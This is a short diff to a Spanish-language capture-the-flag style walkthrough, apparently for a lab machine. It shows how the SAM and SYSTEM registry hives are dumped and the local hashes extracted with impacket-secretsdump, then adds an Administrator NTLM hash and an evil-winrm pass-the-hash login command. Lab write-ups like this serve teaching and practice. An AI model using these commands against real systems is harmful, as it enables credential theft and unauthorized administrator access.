@@ -265,6 +265,14 @@ y con `reg save hklm\system C:\temp\system.hive`
 
 Tercero pasamos el archivo `sam` y `system`  a nuestra maquina atacante con `download sam.hive` y con  `download system.hive`para poder coger los hashes de los usuarios actuales con `impacket-secretsdump -sam sam.hive -system system.hive LOCAL`
 
+Obtenmiendo asi el hash del usuario administrador 
+```ad-hint
+Administrator:2b87e7c93a3e8a0ea4a581937016f341
+```
+
+Ahora nos podmeos conectar a la maquina siendo `Administrador` gracias al hash
+`evil-winrm  -i 10.129.231.149 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341`
+
 
 
 
